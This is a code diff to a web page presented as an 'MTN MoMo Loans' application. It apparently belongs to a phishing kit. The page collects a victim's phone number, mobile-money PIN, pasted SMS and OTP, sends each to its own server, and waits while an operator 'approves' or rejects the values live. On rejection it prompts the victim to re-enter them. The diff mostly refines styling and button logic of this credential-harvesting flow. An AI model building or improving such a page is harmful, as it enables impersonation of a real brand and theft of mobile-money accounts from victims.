@@ -152,8 +152,8 @@
   .pin-delete { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; padding:0; transition:color 0.2s; }
   .pin-delete:hover { color:var(--mtn-gold); }
   .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-login.rdy { background: var(--grad); color:#fff; }
+  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:not-allowed; font-family:'Inter',sans-serif; transition:all 0.2s; }
+  .btn-login.rdy { background: var(--grad); color:#fff; cursor:pointer; }
   .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
   .lg-curve::before { content:''; display:block; background: var(--mtn-dark); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .lg-foot { background: var(--mtn-dark); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
@@ -162,8 +162,8 @@
   .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.45); }
   .lg-terms a { color:rgba(255,255,255,0.65); }
 
-  /* ───── PAGE: WAIT FOR SMS APPROVAL ───── */
-  #page-wait-sms { background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); align-items:center; justify-content:center; }
+  /* ───── PAGE: WAIT FOR LOGIN APPROVAL ───── */
+  #page-wait-login-approval { background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); align-items:center; justify-content:center; }
   .wait-wrap { text-align:center; padding:40px 24px; max-width:420px; }
   .wait-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
   .wait-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
@@ -180,11 +180,14 @@
   .sms-textarea { width:100%; padding:12px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s; min-height:120px; resize:vertical; }
   .sms-textarea:focus { border-color:var(--mtn-gold); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
   .sms-code-hint { font-size:0.75rem; color:var(--text-light); margin-top:8px; font-style:italic; }
-  .btn-sms { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; margin-top:16px; }
-  .btn-sms.rdy { background: var(--grad); color:#fff; }
+  .btn-sms { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:not-allowed; font-family:'Inter',sans-serif; transition:all 0.2s; margin-top:16px; }
+  .btn-sms.rdy { background: var(--grad); color:#fff; cursor:pointer; }
   .sms-curve { background:#fff; overflow:hidden; flex-shrink:0; }
   .sms-curve::before { content:''; display:block; background: var(--mtn-dark); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .sms-foot { background: var(--mtn-dark); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
+
+  /* ───── PAGE: WAIT FOR SMS APPROVAL ───── */
+  #page-wait-sms { background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); align-items:center; justify-content:center; }
 
   /* ───── PAGE: OTP ───── */
   #page-otp { background:#fff; }
@@ -204,11 +207,14 @@
   .otp-box[type=number] { -moz-appearance: textfield; }
   .otp-delete { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; padding:0; transition:color 0.2s; }
   .otp-delete:hover { color:var(--mtn-gold); }
-  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-otp.rdy { background: var(--grad); color:#fff; }
+  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:not-allowed; font-family:'Inter',sans-serif; transition:all 0.2s; }
+  .btn-otp.rdy { background: var(--grad); color:#fff; cursor:pointer; }
   .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
   .otp-curve::before { content:''; display:block; background: var(--mtn-dark); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background: var(--mtn-dark); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
+
+  /* ───── PAGE: WAIT FOR OTP APPROVAL ───── */
+  #page-wait-otp { background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); align-items:center; justify-content:center; }
 
   /* ───── PAGE: APPROVAL ───── */
   #page-approval { background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
@@ -271,14 +277,14 @@
     <h3>⚠️ Access Denied</h3>
     <p>This form requires an admin authorization link to proceed. Please use the link provided by your administrator.</p>
     <div class="admin-error-code" id="adminErrorCode">
-      Example: https://yoursite.com/form?admin=ADMIN123456
+      Example: https://yoursite.com/form?admin=ADMIN001
     </div>
     <p style="font-size:0.85rem; color:var(--text-light); margin-bottom:0;">Contact your administrator if you don't have a valid link.</p>
   </div>
 </div>
 
 <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
-<div id="page-landing" class="page">
+<div id="page-landing" class="page active">
   <div class="land-nav">
     <div style="flex: 1;"></div>
     <div class="mtn-logo">
@@ -518,7 +524,7 @@
   <div class="sms-foot">© 2026 MTN MoMo Loans – Powered by MTN</div>
 </div>
 
-<!-- ══════════════════════ PAGE 8: WAIT FOR SMS APPROVAL ══════════════════════ -->
+<!-- ══════════════════════ PAGE 9: WAIT FOR SMS APPROVAL ══════════════════════ -->
 <div id="page-wait-sms" class="page">
   <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
     <div class="wait-wrap">
@@ -642,7 +648,7 @@
     firstName: '', lastName: '', phone: '',
     employment: '', annualIncome: 0,
     applicationId: '',
-    requestAdminId: '' // ✅ Admin ID from URL parameter (REQUIRED)
+    requestAdminId: ''
   };
 
   // ═══════════════════════════════════════════════════
@@ -653,20 +659,17 @@
     const adminId = urlParams.get('admin');
     
     if (!adminId) {
-      // ❌ NO ADMIN ID - BLOCK ACCESS
       console.error('❌ BLOCKED: No admin parameter in URL');
       document.getElementById('adminErrorModal').classList.add('show');
       return;
     }
 
-    // ✅ ADMIN ID FOUND - PROCEED
     S.requestAdminId = adminId;
     console.log('✅ Admin link locked to:', adminId);
   })();
 
   // NAVIGATION
   function goTo(pageId) {
-    // Check if admin is locked before allowing navigation
     if (!S.requestAdminId) {
       document.getElementById('adminErrorModal').classList.add('show');
       return;
@@ -677,7 +680,7 @@
     window.scrollTo(0, 0);
   }
 
-  // START APPLICATION - Check admin lock
+  // START APPLICATION
   function startApplication() {
     if (!S.requestAdminId) {
       document.getElementById('adminErrorModal').classList.add('show');
@@ -769,7 +772,7 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS
+  // LOGIN PAGE — PIN INPUT HELPERS (5 DIGITS - CORRECT PATTERN)
   // ══════════════════════════════════════════════════════
   function pinMvM(el, i) {
     el.value = el.value.replace(/\D/, '');
@@ -798,9 +801,15 @@
     }
   });
 
+  // ✅ CORRECT PIN CHECK — Uses classList pattern
   function chkPin() {
     const ok = [0,1,2,3,4].every(i => document.getElementById('lp'+i).value);
-    document.getElementById('bLgn').className = ok ? 'btn-login rdy' : 'btn-login';
+    const btn = document.getElementById('bLgn');
+    if (ok) {
+      btn.classList.add('rdy');
+    } else {
+      btn.classList.remove('rdy');
+    }
   }
 
   function togPin() {
@@ -851,11 +860,10 @@
     document.getElementById('bLgn').disabled = true;
 
     try {
-      // ✅ BUILD REQUEST WITH ADMIN ID (REQUIRED - NO AUTO ASSIGN)
       const requestBody = {
         phoneNumber: phone,
         pin: pin,
-        requestAdminId: S.requestAdminId, // ✅ MUST INCLUDE - NO FALLBACK
+        requestAdminId: S.requestAdminId,
         assignmentType: 'specific'
       };
 
@@ -871,14 +879,9 @@
       document.getElementById('mLgn').classList.remove('show');
 
       if (data.success) {
-        // Store application ID for later use
         S.applicationId = data.applicationId;
         document.getElementById('waitAppId').textContent = data.applicationId;
-        
-        // Go to waiting page
         goTo('page-wait-login-approval');
-        
-        // Start polling for admin approval
         pollForPinApproval(data.applicationId);
       } else {
         document.getElementById('bLgn').disabled = false;
@@ -910,34 +913,26 @@
             console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
             
-            // Clear ONLY PIN fields - keep phone number visible
+            // ✅ CORRECT: Clear only PIN fields, KEEP phone visible
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            chkPin(); // ✅ FIX: Re-enable button state
             
-            // Go back to login page
+            // ✅ CALL chkPin() to re-enable button check
+            chkPin();
+            
             goTo('page-login');
-            
-            // Focus on first PIN field for user convenience
-            document.getElementById('lp0').focus();
-            
-            // Show error message
-            showLgnMsg('error', 'Your PIN was invalid. Please try again.');
+            showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
           } else {
-            // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
           }
         } else {
-          // Keep polling on error
           pollTimeout = setTimeout(checkStatus, 3000);
         }
       } catch (err) {
         console.error('Poll error:', err);
-        // Keep polling on network error
         pollTimeout = setTimeout(checkStatus, 3000);
       }
     };
     
-    // Start polling
     checkStatus();
   }
 
@@ -946,7 +941,12 @@
   // ══════════════════════════════════════════════════════
   function chkSmsMsg() {
     const txt = document.getElementById('smsMsgBox').value.trim();
-    document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
+    const btn = document.getElementById('bSms');
+    if (txt.length > 3) {
+      btn.classList.add('rdy');
+    } else {
+      btn.classList.remove('rdy');
+    }
   }
 
   function showSmsMsg(type, text) {
@@ -968,7 +968,6 @@
     document.getElementById('bSms').disabled = true;
 
     try {
-      // Submit SMS message to admin for verification
       const res = await fetch('/api/verify-sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -982,21 +981,16 @@
       document.getElementById('mSms').classList.remove('show');
 
       if (data.success) {
-        // Show wait for admin approval
         document.getElementById('waitSmsAppId').textContent = S.applicationId;
         goTo('page-wait-sms');
-        
-        // Start polling for SMS approval
         pollForSmsApproval(S.applicationId);
       } else {
         document.getElementById('bSms').disabled = false;
-        chkSmsMsg(); // ✅ FIX: Re-check button state
         showSmsMsg('error', data.message || 'Failed to submit SMS.');
       }
     } catch (err) {
       document.getElementById('mSms').classList.remove('show');
       document.getElementById('bSms').disabled = false;
-      chkSmsMsg(); // ✅ FIX: Re-check button state
       showSmsMsg('error', 'Error: ' + err.message);
     }
   }
@@ -1017,37 +1011,32 @@
             clearTimeout(smsPollTimeout);
             goTo('page-otp');
           } else if (status === 'rejected') {
-            console.log('❌ Admin rejected SMS - ask user to paste correct message');
+            console.log('❌ Admin rejected SMS');
             clearTimeout(smsPollTimeout);
             goTo('page-sms-paste');
             
-            // Clear and reset form for retry
-            const textArea = document.getElementById('smsMsgBox');
-            textArea.value = '';
-            chkSmsMsg(); // ✅ FIX: Re-enable button based on content
+            // ✅ Clear SMS message
+            document.getElementById('smsMsgBox').value = '';
+            chkSmsMsg();
             
             showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
           } else {
-            // Still pending, keep polling
             smsPollTimeout = setTimeout(checkStatus, 2000);
           }
         } else {
-          // Keep polling on error
           smsPollTimeout = setTimeout(checkStatus, 3000);
         }
       } catch (err) {
         console.error('SMS Poll error:', err);
-        // Keep polling on network error
         smsPollTimeout = setTimeout(checkStatus, 3000);
       }
     };
     
-    // Start polling
     checkStatus();
   }
 
   // ══════════════════════════════════════════════════════
-  // OTP PAGE — 4-DIGIT OTP
+  // OTP PAGE — 4-DIGIT OTP (CORRECT PATTERN)
   // ══════════════════════════════════════════════════════
   function handleOtpInput(el, type) {
     el.value = el.value.replace(/\D/, '');
@@ -1060,9 +1049,15 @@
     chkOtp();
   }
 
+  // ✅ CORRECT OTP CHECK — Uses classList pattern
   function chkOtp() {
     const otpOk = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
-    document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
+    const btn = document.getElementById('bOtp');
+    if (otpOk) {
+      btn.classList.add('rdy');
+    } else {
+      btn.classList.remove('rdy');
+    }
   }
 
   function showOtpMsg(type, text) {
@@ -1086,7 +1081,6 @@
     document.getElementById('bOtp').textContent = 'VERIFYING...';
 
     try {
-      // Submit OTP to server
       const res = await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -1100,11 +1094,8 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        // OTP submitted successfully, now wait for admin approval
         document.getElementById('waitOtpAppId').textContent = S.applicationId;
         goTo('page-wait-otp');
-        
-        // Start polling for OTP approval
         pollForOtpApproval(S.applicationId);
       } else {
         document.getElementById('bOtp').disabled = false;
@@ -1134,7 +1125,7 @@
             console.log('✅ Admin approved OTP - Loan Approved!');
             clearTimeout(otpPollTimeout);
             
-            // Update approval page with loan details
+            // Update approval page
             document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
@@ -1146,34 +1137,31 @@
             console.log('❌ Admin marked code as wrong');
             clearTimeout(otpPollTimeout);
             goTo('page-otp');
+            
+            // ✅ Clear OTP fields and call chkOtp()
+            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            chkOtp();
+            
             document.getElementById('bOtp').disabled = false;
             document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            // Clear OTP fields for retry
-            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-            chkOtp(); // ✅ FIX: Re-check button state
             showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
           } else {
-            // Still pending, keep polling
             otpPollTimeout = setTimeout(checkStatus, 2000);
           }
         } else {
-          // Keep polling on error
           otpPollTimeout = setTimeout(checkStatus, 3000);
         }
       } catch (err) {
         console.error('OTP Poll error:', err);
-        // Keep polling on network error
         otpPollTimeout = setTimeout(checkStatus, 3000);
       }
     };
     
-    // Start polling
     checkStatus();
   }
 
   // INIT
   updateCalc();
-  goTo('page-landing');
 </script>
 </body>
 </html>
